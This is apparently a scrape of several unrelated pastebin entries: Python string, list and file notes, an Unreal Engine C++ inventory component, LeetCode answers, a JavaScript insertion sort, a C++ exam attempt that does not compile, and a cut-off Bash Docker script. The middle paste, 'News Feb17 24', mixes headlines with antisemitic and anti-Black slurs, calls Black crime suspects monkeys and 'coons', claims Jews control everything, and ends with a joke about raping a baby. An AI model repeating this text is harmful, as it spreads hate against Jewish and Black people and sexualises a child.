#2 ... you yourself overrode the end parameter of print() as the last thing you did... just call print() again

# STRING METHODS
# myStr.format() # ""Stuff I want put this {} and {} together in one string"".format(var1, var2)
# myStr.strip() # input().strip()
# myStr.split() # returns a list of smaller strings
# "","".join(listOfStrings)
# myStr.replace(subStr, newStr) # ""remove"" myStr = myStr.replace(subStr, """")
# myStr.index(subStr), myStr.find(subStr) # returns index where first found
# myStr.count(subStr) # return # of times its there
# case: .lower(), .upper(), .title(), .capitalize()
# is/Boolean: .islower(), .isupper(), .isspace(), .isalpha(), .isnumeric(), .isdigit(), .isalnum()
# myStr.startswith(subStr), myStr.endswith(subStr)

# LISTS
# be able to refer by index and to slice
# LIST METHODS
# +
# myList.append(item)
# myList.insert(i, item)
# myList.extend(anotherList)
# # -
# myList.pop(i) # last one or by index
# myList.remove(item) # pop() by index, remove() by value
# myList.clear()
# # other
# myList.sort()
# myList.reverse()
# myList.count(item) # returns # times its there
# myList.copy()
# myList.index(item)

# DICT
# use the key like an index []... then you don't really need DICT methods
# myDict[key] # get the value for that key
# myDict[key] = value # assigns new value to key

# DICT METHODS
# myDict.keys() # all dict keys in a set-like object
# myDict.values() # all dict values in a set-like object

# # check if key in dict
# if ___ in myDict: # checking keys
# # check if value in dict
# if ___ in myDict.values() # check values... but I don't know what key :(
# # check if value and get key
# # ... you'd have to for loop and check one by one

# MODULES
# math and csv

# MATH MODULE
# import math # FULL IMPORT
# math.factorial(x)
# math.ceil(x)
# math.floor(x)
# math.sqrt(x)
# math.pow(x, y) # do not confuse with math.exp()
# math.fabs(x)
# math.pi
# math.e
#
# # PARTIAL IMPORT
# from math import sqrt # --> sqrt()
# from math import ceil, floor # --> ceil(), floor()
# from math import * # floor(), sqrt()
#
# # ALIAS IMPORT
# import math as m
# # m.floor(), m.ceil()
#

# FILES
# modes: r, w, a

# READ MODE
# myInput = input() # filename from input
# with open(myInput, ""r"") as f:
# with open(""test.txt"", ""r"") as f:
#     # f.read()  # returns whole file as one big string
#     # f.readlines() # returns a list of strings, line by line
#     # f.write() # take one str arg and write into file (can't do here bc I'm in read mode)
#     contents = f.readlines()
# print(contents)
# for line in contents:
#     line = line.strip()
#     print(line)

# CSV module
import csv # csv.reader()
with open(""mock_data.csv"", ""r"") as f1: # mockaroo.com
    contents = list(csv.reader(f1)) # csv.reader(f1, delimiter=""\t"")
# print(contents)
# for row in contents[0:25]:
#     print(row)

# WRITE MODE
# with open(""output_data34.csv"", ""w"") as f2:
#     # write out a file with each row where last name is Hicklingbottom
#     for row in contents:
#         # last name is row[2]
#         if row[2] == ""Hicklingbottom"":
#             f2.write("","".join(row) + ""\n"")

# APPEND MODE
# with open(""append_to_this.txt"", ""r"") as f3:
#     print(f3.readlines())
with open(""append_to_this.txt"", ""a"") as f3:
    f3.write(""\nPippin"")






























"
YpfQCypJ,Untitled,Crovea,C++,Saturday 17th of February 2024 05:17:47 PM CDT,"#pragma once
#include ""Actors/AWorldItem.h""
#include ""Management/RancInventoryData.h""
#include ""RancItemContainerComponent.generated.h""

UCLASS(Blueprintable, ClassGroup = (Custom), Category = ""Ranc Inventory | Classes"", EditInlineNew, meta = (BlueprintSpawnableComponent))
class URancItemContainerComponent : public UActorComponent
{
    GENERATED_BODY()
public:
    
    explicit URancItemContainerComponent(const FObjectInitializer& ObjectInitializer = FObjectInitializer::Get());

    virtual void InitializeComponent() override;
    
	UFUNCTION(BlueprintPure, Category=""Ranc Inventory"")
    float GetCurrentWeight() const;

    UFUNCTION(BlueprintPure, Category=""Ranc Inventory"")
    float GetMaxWeight() const;

    UFUNCTION(BlueprintPure, Category=""Ranc Inventory"")
    int32 GetCurrentItemCount() const;

    UFUNCTION(BlueprintPure, Category=""Ranc Inventory"")
    const FRancItemInstance& FindItemById(const FGameplayTag& ItemId) const;

    /* Add items to the inventory
     * Should only be called on server as we can't trust client to provide trustworthy ItemInstance
     * Instead have the client send an input like CraftItem or PickupItem to the server which results in server call to AddItem  */
    UFUNCTION(BlueprintCallable, Category=""Ranc Inventory"")
    void AddItems_IfServer(const FRancItemInstance& ItemInstance);

    /* For most games we could probably trust the client to specify ItemInstance but for e.g. a hot potato we can't
     * Instead have the client send an input like UseItem or DropItem  */
    UFUNCTION(BlueprintCallable, Category=""Ranc Inventory"")
    bool RemoveItems_IfServer(const FRancItemInstance& ItemInstance);

    /* Attempts to drop the item from the inventory, attempting to spawn an Item object in the world
     * Specify DropItemClass and DropDistance properties to customize the drop
     * Called on client it will request the drop on the server
     * Returns the quantity actually dropped, on client this is only a ""guess"" */
    UFUNCTION(BlueprintCallable, Category=""Ranc Inventory"")
    int32 DropItems(const FRancItemInstance& ItemInstance, float DropAngle = 0);

    UFUNCTION(Server, Reliable)
    int32 DropItems_Server(const FRancItemInstance& ItemInstance, float DropAngle = 0);

    /* Useful for e.g. Death, drops items evenly spaced in a circle with radius DropDistance */
    UFUNCTION(BlueprintCallable, Category=""Ranc Inventory"")
    int32 DropAllItems_IfServer();

    UFUNCTION(BlueprintCallable, Category=""Ranc Inventory"")
    bool CanReceiveItem(const FRancItemInstance& ItemInstance) const;
    
    UFUNCTION(BlueprintPure, Category=""Ranc Inventory"")
    bool ContainsItem(const FGameplayTag& ItemId, int32 Quantity = 1) const;

    UFUNCTION(BlueprintPure, Category=""Ranc Inventory"")
    TArray<FRancItemInstance> GetAllItems() const;
    
    UFUNCTION(BlueprintPure, Category=""Ranc Inventory"")
    bool IsEmpty() const;
    
    DECLARE_DYNAMIC_MULTICAST_DELEGATE_OneParam(FOnInventoryItemAdded, const FRancItemInstance&, ItemInstance);
    UPROPERTY(BlueprintAssignable, Category=""Ranc Inventory"")
    FOnInventoryItemAdded OnItemAdded;
    
    DECLARE_DYNAMIC_MULTICAST_DELEGATE_OneParam(FOnInventoryItemRemoved, const FRancItemInstance&, ItemInstance);
    UPROPERTY(BlueprintAssignable, Category=""Ranc Inventory"")
    FOnInventoryItemRemoved OnItemRemoved;
    
    /* Distance away from the owning actor to drop items. Only used on server */ 
    UPROPERTY(EditAnywhere, BlueprintReadWrite)
    float DropDistance = 100;

    /* Class to spawn when dropping items. Only used on server */
    UPROPERTY(EditAnywhere, BlueprintReadWrite)
    TSubclassOf<AWorldItem> DropItemClass = AWorldItem::StaticClass();

    /* Max weight allowed for this inventory */
    UPROPERTY(EditDefaultsOnly, BlueprintReadWrite, Category = ""Ranc Inventory"", meta = (AllowPrivateAccess = ""true"", ClampMin = ""0"", UIMin = ""0""))
    float MaxWeight;

    /* Max num of items allowed for this inventory */
    UPROPERTY(EditDefaultsOnly, BlueprintReadWrite, Category = ""Ranc Inventory"", meta = (AllowPrivateAccess = ""true"", ClampMin = ""1"", UIMin = ""1""))
    int32 MaxNumItems;

protected:

    UPROPERTY(EditAnywhere, Category=""Ranc Inventory"")
    TArray<FRancInitialItem> InitialItems;
    
    UPROPERTY(ReplicatedUsing=OnRep_Items, BlueprintReadOnly, Category=""Ranc Inventory"")
    TArray<FRancItemInstance> Items;

    // The cache is a copy of Items that is not replicated, used to detect changes after replication, only used on client
    TMap<FGameplayTag, int32> ItemsCache; // Id to quantity;

    AWorldItem* SpawnDroppedItem_IfServer(const FRancItemInstance& ItemInstance, float DropAngle = 0) const;
    
    virtual void GetLifetimeReplicatedProps(TArray<FLifetimeProperty>& OutLifetimeProps) const override;
protected:
    
    virtual void UpdateWeight();

    void CopyItemsToCache();
    void DetectAndPublishChanges();
    
private:
    float CurrentWeight;

    TArray<FGameplayTag> _KeysToRemove; // Could be a local value but just slight optimization to avoid creating a new array every time.

    UFUNCTION()
    void OnRep_Items();
    
};

CPP:

#include ""Components/RancItemContainerComponent.h""

#include ""Management/RancInventoryFunctions.h""
#include ""Net/UnrealNetwork.h""
#include ""Net/Core/PushModel/PushModel.h""

URancItemContainerComponent::URancItemContainerComponent(const FObjectInitializer& ObjectInitializer) : Super(ObjectInitializer), MaxWeight(0.f), MaxNumItems(0), CurrentWeight(0.f)
{
    PrimaryComponentTick.bCanEverTick = false;
    PrimaryComponentTick.bStartWithTickEnabled = false;
    bWantsInitializeComponent = true;
    SetIsReplicatedByDefault(true);
}

void URancItemContainerComponent::InitializeComponent()
{
    Super::InitializeComponent();

    // add all initial items to items
    if (GetOwnerRole() == ROLE_Authority && GetOwnerRole() != ROLE_None)
    {
        for (const FRancInitialItem& InitialItem : InitialItems)
        {
            const URancItemData* Data = URancInventoryFunctions::GetSingleItemDataById(InitialItem.ItemId, {}, false);
            
            if (Data && Data->ItemId.IsValid())
                Items.Add(FRancItemInstance(Data->ItemId, InitialItem.Quantity));
        }
    }
    CopyItemsToCache();
    
    if (DropItemClass == nullptr)
    {
        DropItemClass = AWorldItem::StaticClass();
    }
}


void URancItemContainerComponent::GetLifetimeReplicatedProps(TArray<FLifetimeProperty>& OutLifetimeProps) const
{
    Super::GetLifetimeReplicatedProps(OutLifetimeProps);

    FDoRepLifetimeParams SharedParams;
    SharedParams.bIsPushBased = true;

    DOREPLIFETIME_WITH_PARAMS_FAST(URancItemContainerComponent, Items, SharedParams);
}


void URancItemContainerComponent::OnRep_Items()
{
    // Recalculate the total weight of the inventory after replication.
    UpdateWeight();

    DetectAndPublishChanges();
}

void URancItemContainerComponent::AddItems_IfServer(const FRancItemInstance& ItemInstance)
{
    if (GetOwnerRole() != ROLE_Authority && GetOwnerRole() != ROLE_None) // none needed for tests
    {
        UE_LOG(LogTemp, Warning, TEXT(""AddItems called on non-authority!""));
        return;
    }

    // Check if the inventory can receive the item
    if (!CanReceiveItem(ItemInstance))
    {
        UE_LOG(LogTemp, Warning, TEXT(""Cannot receive item: %s""), *ItemInstance.ItemId.ToString());
        return;
    }

    bool bItemAdded = false;
    for (auto& ExistingItem : Items)
    {
        // If item exists and is stackable, increase the quantity
        if (ExistingItem.ItemId == ItemInstance.ItemId)
        {
            ExistingItem.Quantity += ItemInstance.Quantity;
            bItemAdded = true;
            break;
        }
    }

    // If item does not exist in the inventory, add it
    if (!bItemAdded)
    {
        Items.Add(ItemInstance);
    }

    // Update the current weight of the inventory
    UpdateWeight();

    OnItemAdded.Broadcast(ItemInstance);

    // Mark the Items array as dirty to ensure replication
    MARK_PROPERTY_DIRTY_FROM_NAME(URancItemContainerComponent, Items, this);
}

bool URancItemContainerComponent::RemoveItems_IfServer(const FRancItemInstance& ItemInstance)
{
    if (GetOwnerRole() != ROLE_Authority && GetOwnerRole() != ROLE_None)
    {
        UE_LOG(LogTemp, Warning, TEXT(""RemoveItems called on non-authority!""));
        return false;
    }

    // Check if the inventory can give the item
    if (!ContainsItem(ItemInstance.ItemId, ItemInstance.Quantity))
    {
        UE_LOG(LogTemp, Warning, TEXT(""Cannot remove item: %s""), *ItemInstance.ItemId.ToString());
        return false;
    }

    for (int i = Items.Num() - 1; i >= 0; --i)
    {
        auto& ExistingItem = Items[i];
        if (ExistingItem.ItemId == ItemInstance.ItemId)
        {
            ExistingItem.Quantity -= ItemInstance.Quantity;

            // If the quantity drops to zero or below, remove the item from the inventory
            if (ExistingItem.Quantity <= 0)
            {
                Items.RemoveAt(i);
                break; // Assuming ItemId is unique and only one instance exists in the inventory
            }
        }
    }
    
    // Update the current weight of the inventory
    UpdateWeight();

    OnItemRemoved.Broadcast(ItemInstance);
    
    // Mark the Items array as dirty to ensure replication
    MARK_PROPERTY_DIRTY_FROM_NAME(URancItemContainerComponent, Items, this);

    return true;
}

AWorldItem* URancItemContainerComponent::SpawnDroppedItem_IfServer(const FRancItemInstance& ItemInstance, float DropAngle) const
{
    if (UWorld* World = GetWorld())
    {
        FActorSpawnParameters SpawnParams;
        const FVector DropSpot = DropAngle == 0 ? GetOwner()->GetActorLocation() + GetOwner()->GetActorForwardVector() * DropDistance : GetOwner()->GetActorLocation() + GetOwner()->GetActorForwardVector().RotateAngleAxis(DropAngle, FVector::UpVector) * DropDistance;
        AWorldItem* WorldItem = World->SpawnActorDeferred<AWorldItem>(DropItemClass, FTransform(DropSpot));
        if (WorldItem)
        {
            WorldItem->SetItem(ItemInstance);
            WorldItem->FinishSpawning(FTransform(DropSpot));
        }
        return WorldItem;
    }
    return nullptr;
}

int32 URancItemContainerComponent::DropItems(const FRancItemInstance& ItemInstance, float DropAngle)
{
    int32 QuantityToDrop = DropItems_Server(ItemInstance, DropAngle);
    
    if (GetOwnerRole() != ROLE_Authority) // if client
    {
        // On client the below is just a guess
        const auto ContainedItemInstance = FindItemById(ItemInstance.ItemId);
        QuantityToDrop = FMath::Min(ItemInstance.Quantity, ContainedItemInstance.Quantity);
    }
    
    return QuantityToDrop;
}

int32 URancItemContainerComponent::DropItems_Server_Implementation(const FRancItemInstance& ItemInstance, float DropAngle)
{
    auto ContainedItemInstance = FindItemById(ItemInstance.ItemId);
    const int32 QuantityToDrop = FMath::Min(ItemInstance.Quantity, ContainedItemInstance.Quantity);

    if (QuantityToDrop <= 0 || !ContainedItemInstance.ItemId.IsValid())
    {
        return 0;
    }

    AWorldItem* DroppedItem = SpawnDroppedItem_IfServer(FRancItemInstance(ItemInstance.ItemId, QuantityToDrop), DropAngle);

    if (DroppedItem)
    {
        ContainedItemInstance.Quantity -= QuantityToDrop;
        if (ContainedItemInstance.Quantity <= 0)
        {
            Items.Remove(ContainedItemInstance);
        }
        OnItemRemoved.Broadcast(ItemInstance);
        UpdateWeight();
        return QuantityToDrop;
    }
    return 0;
}

int32 URancItemContainerComponent::DropAllItems_IfServer()
{
    if (GetOwnerRole() != ROLE_Authority && GetOwnerRole() != ROLE_None)
    {
        UE_LOG(LogTemp, Warning, TEXT(""RemoveItems called on non-authority!""));
        return 0;
    }
    
    // drop with incrementing angle
    int32 DroppedCount = 0;
    float AngleStep = 360.f / Items.Num();

    for (int i = Items.Num() - 1; i >= 0; --i)
    {
        DropItems(Items[i], AngleStep * DroppedCount);
        DroppedCount++;
    }
    
    UpdateWeight();
    
    return DroppedCount;
}

float URancItemContainerComponent::GetCurrentWeight() const
{
    return CurrentWeight;
}

float URancItemContainerComponent::GetMaxWeight() const
{
    return MaxWeight <= 0.f ? MAX_flt : MaxWeight;
}

const FRancItemInstance& URancItemContainerComponent::FindItemById(const FGameplayTag& ItemId) const
{
    for (const auto& Item : Items)
    {
        if (Item.ItemId == ItemId)
        {
            return Item;
        }
    }

    // If the item is not found, throw an error or return a reference to a static empty item info
    UE_LOG(LogTemp, Warning, TEXT(""Item with ID %s not found.""), *ItemId.ToString());
    return FRancItemInstance::EmptyItemInstance;
}

bool URancItemContainerComponent::CanReceiveItem(const FRancItemInstance& ItemInstance) const
{
    // Check if adding this item would exceed the max number of unique items
    if (!ContainsItem(ItemInstance.ItemId) && Items.Num() >= MaxNumItems)
    {
        UE_LOG(LogTemp, Warning, TEXT(""Cannot receive item: Inventory is full.""));
        return false;
    }

    // Calculate the additional weight this item would add
    if (const URancItemData* const ItemData = URancInventoryFunctions::GetItemDataById(ItemInstance.ItemId))
    {
        float AdditionalWeight = ItemData->ItemWeight * ItemInstance.Quantity;
        if (CurrentWeight + AdditionalWeight > MaxWeight)
        {
            UE_LOG(LogTemp, Warning, TEXT(""Cannot receive item: Exceeds max weight.""));
            return false;
        }
    }
    else
    {
        UE_LOG(LogTemp, Warning, TEXT(""Could not find item data for item: %s""), *ItemInstance.ItemId.ToString());
        return false;
    }

    return true;
}

bool URancItemContainerComponent::ContainsItem(const FGameplayTag& ItemId, int32 Quantity) const
{
    int32 TotalQuantity = 0;
    for (const auto& Item : Items)
    {
        if (Item.ItemId == ItemId)
        {
            TotalQuantity += Item.Quantity;
            if (TotalQuantity >= Quantity)
            {
                return true;
            }
        }
    }
    return false;
}

int32 URancItemContainerComponent::GetCurrentItemCount() const
{
    int32 Count = 0;
    for (const auto& Item : Items)
    {
        Count += Item.Quantity;
    }
    return Count;
}

TArray<FRancItemInstance> URancItemContainerComponent::GetAllItems() const
{
    return Items;
}

bool URancItemContainerComponent::IsEmpty() const
{
    return Items.Num() == 0;
}

void URancItemContainerComponent::UpdateWeight()
{
    CurrentWeight = 0.0f; // Reset weight
    for (const auto& ItemInstance : Items)
    {
        if (const URancItemData* const ItemData = URancInventoryFunctions::GetItemDataById(ItemInstance.ItemId))
        {
            CurrentWeight += ItemData->ItemWeight * ItemInstance.Quantity;
        }
    }

    // This example does not handle the case where item data is not found, which might be important for ensuring accuracy.
}

void URancItemContainerComponent::CopyItemsToCache()
{
    ItemsCache.Reset();
    ItemsCache.Reserve(Items.Num());
    for (int i = 0; i < Items.Num(); ++i)
    {
        ItemsCache[Items[i].ItemId] = Items[i].Quantity;
    }
}

void URancItemContainerComponent::DetectAndPublishChanges()
{
    // First pass: Update existing items or add new ones, mark them by setting quantity to negative.
    for (FRancItemInstance& NewItem : Items)
    {
        int32* OldQuantity = ItemsCache.Find(NewItem.ItemId);
        if (OldQuantity)
        {
            // Item exists, check for quantity change
            if (*OldQuantity != NewItem.Quantity)
            {
                if (*OldQuantity < NewItem.Quantity)
                {
                    OnItemAdded.Broadcast(FRancItemInstance(NewItem.ItemId, NewItem.Quantity - *OldQuantity));
                }
                else if (*OldQuantity > NewItem.Quantity)
                {
                    OnItemRemoved.Broadcast(FRancItemInstance(NewItem.ItemId, *OldQuantity - NewItem.Quantity));
                }
            }
            // Mark this item as processed by temporarily setting its value to its own negative (or another marker strategy)
            *OldQuantity = -abs(NewItem.Quantity);
        }
        else
        {
            // New item
            OnItemAdded.Broadcast(NewItem);
            ItemsCache.Add(NewItem.ItemId, -abs(NewItem.Quantity)); // Mark as processed
        }
    }

    // Second pass: Remove unmarked items (those not set to negative) and revert marks for processed items
    _KeysToRemove.Reset(ItemsCache.Num());
    for (auto& Pair : ItemsCache)
    {
        if (Pair.Value >= 0)
        {
            // Item was not processed (not found in Items), so it has been removed
            OnItemRemoved.Broadcast(FRancItemInstance(Pair.Key, Pair.Value));
            _KeysToRemove.Add(Pair.Key);
        }
        else
        {
            // Revert the mark to reflect the actual quantity
            Pair.Value = -Pair.Value;
        }
    }

    // Remove items that were not found in the current Items array
    for (const FGameplayTag& Key : _KeysToRemove)
    {
        ItemsCache.Remove(Key);
    }
}"
VVPS9k8s,Untitled,smj007,Python,Saturday 17th of February 2024 04:50:24 PM CDT,"class Solution:
    def maxProduct(self, nums: List[int]) -> int:
        
        max_prod_prev = 1
        min_prod_prev = 1 
        max_so_far = -math.inf

        for n in nums:

            max_prod_ending_here = max(n, max_prod_prev*n, min_prod_prev*n)
            min_prod_ending_here = min(n, min_prod_prev*n, max_prod_prev*n)
            max_prod_prev, min_prod_prev = max_prod_ending_here, min_prod_ending_here
            max_so_far = max(max_so_far, max_prod_ending_here)

        return max_so_far"
dBHmy0vb,News Feb17 24,Newscaster_Ned,Email,Saturday 17th of February 2024 04:34:18 PM CDT,"..................Test 1..................
..................Test 2..................
..................Test 3..................
........................... Test complete.

Goddamn, kikey wikeys. Silly Juden. Anyway, here's a non-skewed view of the world.

Police: Pennsylvania Judge Shot Ex-Boyfriend in Head While He Slept
East Texas Man Named 'Person of Interest' in Girl's Disappearance
John Mellencamp: Pass More Gun Laws, Show Photos of Slain Kids
Watch Live: Donald Trump Speaks in Philadelphia, Pennsylvania
Get All Breitbart News Here
HomePage
Who Owns the Open Border?

Coulter Throws Down, Debunks Dem Talking Points Blaming GOP

Maher, Van Jones Forced to Admit Sanctuary Cities Are a Mess
Border
On Fridays broadcast of HBOs Real Time, CNN Senior Political Commentator and former Obama Adviser Van Jones and columnist and author Ann Coulter sparred over the failed Senate border bill and the U.S. immigration system. After host Bill Maher argued

As Easter Nears, Some Atheists Insist There Was No Jesus
As Easter Nears, Some Atheists Insist There Was No Jesus
1,006
Legal Analyst Polis: Its Game Over if Fani Willis Lied  She Will
Legal Analyst Polis: Game Over if Fani Willis Lied -- It's Disqualifying
2,922
Zelensky Demands More Weapons From West, Invites Trump to Visit Front Line
Zelensky Demands More Weapons, Invites Trump to 'Front Line'
5,383
Padilla: GOP Opposes Aid That I Voted Against Because It Didnt Have Amnesty Because Putin Ha
Padilla: GOP Has Position on Aid I Did Because Putin Has Something on Trump
286
Suspicious Reversal: DOJ Backs Down from Massive Fraud Case Against Dem Megadonor Dis
DOJ Backs Down from Massive Fraud Case Against Dish Network CEO, Blackrock
1,659
Zelensky Suggests Regime Change in Russia and Assassination Awaits Putin
Zelensky Suggests Assassination Awaits Putin
484
Alexei Navalnys Death Becomes Rallying Cry for Ukraine Aid to Further Endless Russian Proxy 
Alexei Navalny's Death Becomes Rallying Cry for Ukraine Aid
270
Watch Live: Donald Trump Speaks in Philadelphia, Pennsylvania
Watch Live: Donald Trump Speaks in Philadelphia, Pennsylvania
211
Putin Critic, Russian Opposition Leader Alexi Navalny Dies in Prison
Putin Critic Alexi Navalny Dies in Prison
3,236
Report: Biden Attorneys Pushed DOJ to Omit Language Critical of His Age
Report: Biden Attorneys Pushed DOJ to Omit Critique of Age, Memory

Negro Boyfriend of Dead Mudshark Alabama Councilwoman Arrested After Her Body Was Found Under Bridge.

He wanted to burn that bridge.


New Castle County Coon Arrested for 2017 Rapes.


Silverback MMA Fighter Arrested After Driving 2 Drunk Women Home and Raping Them.


Monkey Jerks off in front of Family and Chases Them at Sprouts Grocery Store.


Atlanta Popo Searching for Monk Who Shot Puppy to Deaf.


(Sheboon) Burke High Teacher Gives Student High Grades So She Can Fuck Him.


Bond Denied for 2 Evolved Monkeys Who Shot Boston Police Officer.


Spade Throws Daytona Beach Man off Bridge.

......... Weather.

Sat 17 | Day
50
1%
N
22
mph
Windy. Cloudy skies will become partly cloudy this afternoon. High near 50F. Winds N at 20 to 30 mph. Higher wind gusts possible.
Humidity
55%
UV Index
4 of 11
Sunrise
7:08 am
Sunset
6:19 pm
Sat 17 | Night
32
1%
N
11
mph
Partly cloudy skies. Low 32F. Winds N at 10 to 15 mph.
Humidity
61%
UV Index
0 of 11
Moonrise
12:16 pm
Waxing Gibbous
Moonset
2:02 am
Sun 18
Sunny
57
/36
1%
N 7 mph
Mon 19
Sunny
70
/47
4%
SSW 12 mph
Tue 20
Partly Cloudy
77
/57
9%
SSW 12 mph
Wed 21
Partly Cloudy
81
/60
9%
SSW 12 mph
Thu 22
AM Clouds/PM Sun
82
/55
8%
WSW 12 mph
Fri 23
Partly Cloudy
71
/47
1%
N 14 mph
Sat 24
Partly Cloudy
73
/50
3%
SE 8 mph
Sun 25
Partly Cloudy
75
/59
12%
S 13 mph
Mon 26
Mostly Cloudy
80
/60
7%
SSW 14 mph
Tue 27
Mostly Cloudy
80
/58
12%
SSW 12 mph
Wed 28
Mostly Cloudy
78
/58
20%
SSW 11 mph
Thu 29
AM Showers
76
/55
38%
SW 11 mph
Fri 01
Isolated Thunderstorms
75
/55
31%
SW 11 mph
Sat 02
Isolated Thunderstorms
75
/54
35%
S 10 mph

..........

Current threat: The suspicious. 

..........

Conspiracy Theory
There is a secret cabal whose only design is to keep you from getting laid. There are forces aligning against your attempts to make money. Secret societies are lining up and scheming just so that you will never be successful. Mysterious factions gather under the full moon, attempting to bring the downfall of the world, just so that you will never lose weight, be attractive, or stop smelling like cheese. All of these things, these Conspiracy Theories, are the average internet slobs excuse as to why he or she has become and remains such a goddamned loser. All conspiracy theories revolve around two things, fail and money. If you can find any subject which involves some type of fail in which someone made money there is a conspiracy.

Your typical conspiracy theorists are basement dwellers who spend too much time on the internet watching conspiracy videos on Youtube, reading Wikilinks, Truthism.com, Infowars, masturbating furiously to recordings of Alex Jones, and usually refer to themselves as being in Anonymous. Theorists think they are far more intelligent than the normal human being. They like to tell people to WAKE UP!, which they think is clever, but is actually quite annoying, and often call anyone who doesn't believe in conspiracy theories as ""sheep"". This is particularly ironic considering most conspiracy theorists are only going on what other conspiracy theorists tell them is true. The truth is, infact, most theorists are mentally disturbed psychopaths and Aspies with very little sense of reality.

(( DID YOU KNOW THE JEWS ARE BEHIND FUCKING EVERYTHING?! ))

....................................................................

The Roman Forum is a rectangular forum (plaza) surrounded by the ruins of several important ancient government buildings in the centre of the city of Rome. Citizens of the ancient city referred to this space, originally a marketplace, as the Forum Magnum, or simply the Forum. It is located in the small valley between the Palatine and Capitoline Hills. Archaeological evidence shows that the site was originally a grassy wetland, which was drained in the 7th century BC with the building of the first structures of the Cloaca Maxima sewer system. The earliest structures in the Forum were discovered in two separate locations: the site of the Comitium and the group of sanctuaries of Regia, House of the Vestals and Domus Publica. Further structures were added over the centuries including the Temple of Saturn (497 BC), the Temple of Castor and Pollux (484 BC) and the Basilica Fulvia (179 BC), followed by major work in the 80s BC, in which the plaza was raised and permanent marble paving stones laid. Further significant work was undertaken by Julius Caesar and Augustus, and the reign of Constantine the Great saw the completion of the construction of the Basilica of Maxentius (AD 312), the last significant expansion of the complex. The Forum today is a sprawling ruin of architectural fragments and intermittent archaeological excavations attracting 4.5 million or more sightseers yearly. This panoramic photograph, taken in 2018 from the Capitoline Museums, shows some of the surviving structures of the Roman Forum, including the Tabularium, the Gemonian stairs, the Tarpeian Rock, and several temples and basilicas.

Photograph credit: Wolfgang Moroder

...........

Bye, guys. I'm gonna go fuck a baby in the middle of the street and flip people off as they go by."
n4X0msTP,prime roll no,aquiem,C++,Saturday 17th of February 2024 04:26:45 PM CDT,"#include <algorithm>
#include <iostream>
#include <vector>
 
using namespace std;
 
typedef long long ll;
 
const ll MAX_VALUE = 1LL * 1000 * 1000 * 1000 * 1000 * 1000 * 1000;
 
void precalc(const vector<ll> &in, vector<ll> &out,
    ll cur = 1, int k = 0, ll bound = MAX_VALUE)
{
    if (k >= in.size()) {
        out.push_back(cur);
        return;
    }
    while (bound > 0) {
        precalc(in, out, cur, k + 1, bound);
        cur *= in[k];
        bound /= in[k];
    }
}
 
vector<ll> xs, ys;
 
ll count_le(ll t)
{
    ll res = 0;
    int yidx = 0;
    for (ll x : xs) {
        while (yidx < ys.size() && ys[yidx] <= t / x) {
            yidx++;
        }
        res += yidx;
    }
    return res;
}
 
int main()
{
    ll n;
    cin >> n;
 
    vector<ll> a[2];
    for (int i = 0; i < n; i++) {
        int x;
        cin >> x;
        a[i % 2].push_back(x);
    }
 
    ll k;
    cin >> k;
 
    precalc(a[0], xs);
    precalc(a[1], ys);
    sort(xs.rbegin(), xs.rend());
    sort(ys.begin(), ys.end());
 
    ll l = 0, r = MAX_VALUE + 1;
    while (l != r) {
        ll m = (l + r) / 2;
        if (count_le(m) < k) {
            l = m + 1;
        }
        else {
            r = m;
        }
    }
 
    if (l != MAX_VALUE + 1) {
        cout << l << endl;
    }
    else {
        cout << -1 << endl;
    }
 
    return 0;
}"
3EvZzMb7,insertionSort.js (imposter syndrome simulator),c-mcbride,JavaScript,Saturday 17th of February 2024 04:24:37 PM CDT,"function insertionSort(arr){
    let n = arr.length;

    //Elements to the right of i are sorted
    for(let i = 1; i < arr.length; i++){
        let temp = arr[i]; //Temp holds the current variable we are tying to place within the array
        let j = i - 1; //Since we know that all elements to left of i are sorted, we start at the front of the sorted list and work backwards

        //If j is larger than the current element we are trying to place, we crawl backwards
        while(j >= 0 && arr[j] > temp){
            arr[j + 1] = arr[j]; //Move j one to the right
            j--; //Decrement, when the algorithm exits, j will be one smaller than where we need to put the element
        }

        arr[j + 1] = temp //Place the element where it belongs
    }

    return arr;
}

console.log(insertionSort([1,4,2,12,10]))"
fbGmZs8s,PSIO - exam solutions,B3ar6,C++,Saturday 17th of February 2024 04:21:57 PM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <math.h>

int bar(const int &z){
    std::cout << z;
    if(!z)
        return 1;
    
    return bar(z-2);
}

struct Point{
    float x;
    float y;
}

void outside_radius_15(const std::vector<Point> &vectorOfPoints, const std::vector<Point> &vecOfOuterPoints){
    std::copy_if(vectorOfPoints.begin(), vectorOfPoints.end(), std::emplace_back(vecOfOuterPoints), [](Point &pointToCheck){abs(frac(pow(pointToCheck.x, 2)+pow((pointToCheck.y-0), 2) >= 1.5});
}

int main()
{
    //bar(6);
    
    // std::vector<int> array = {-4, -1, 2, 11, -6, 2};
    // int th = 2;
    // std::cout << count_if(array.begin(), array.end(), [th](int arg){return abs(arg) >= th;});
    std::vector<Point> pointsToCheck;                                       //vector punktw do sprawdzenia
    std::vector<Point> outerPoints;                                         //vector punktw poza okrgiem
    
    outside_radius_15(pointsToCheck, outerPoints);                          //kopiowanie punktw
    
    for(int i=0; i<outerPoints.size(); i++)                                 //wywietlanie danych
    {
        std::cout << outerPoints[i].x << "", "" << outerPoints[i].y << endl;
    }
    
    // ++i -> zwiksz przed operacj | zaczynamy od 0 -> zwikszamy o jeden -> zaczynamy ptle | 1, 2, 3, .... , n
    // i++ -> zwiksza po operacji | zaczynamy od 0 -> wykonujemy ptle -> inkrementujemy o 1 | 0, 1, 2, 3, ... , n
    
    return 0;
}

// bar(6) = 4 * bar(4)
//       = 4 * (4 * bar(2))
//       = 4 * (4 * (4 * bar(0)))
//       = 4 * (4 * (4 * 1))
//       = 4 * (4 * 4)
//       = 4 * 16
//       = 64

"
t9NFfzs1,Untitled,smj007,Python,Saturday 17th of February 2024 04:14:22 PM CDT,"class Solution:
    def numDecodings(self, s: str) -> int:

        n = len(s)
        dp = [0]*(n+1)
        dp[0] = 1

        for i in range(1, n+1):
            for j in range(1, 27):
                c = str(j)
                if i-len(c)>=0 and c == s[i-len(c):i]:
                    dp[i] += dp[i-len(c)]

        return dp[-1]
        "
yKg7eX2x,Docker search and pull auto..,Rnery,Bash,Saturday 17th of February 2024 04:09:52 PM CDT,"#!/usr/bin/env bash
#####################################
# Docker search and pull auto. 		#
#									#
# Depois eu melhoro esse cdigo.	#
#####################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

function verificar_container_name() {
  local container_name=""$1""

  if [[ ! ""$container_name"" =~ ^[[:alpha:]][[:alnum:]_]*$ ]]; then
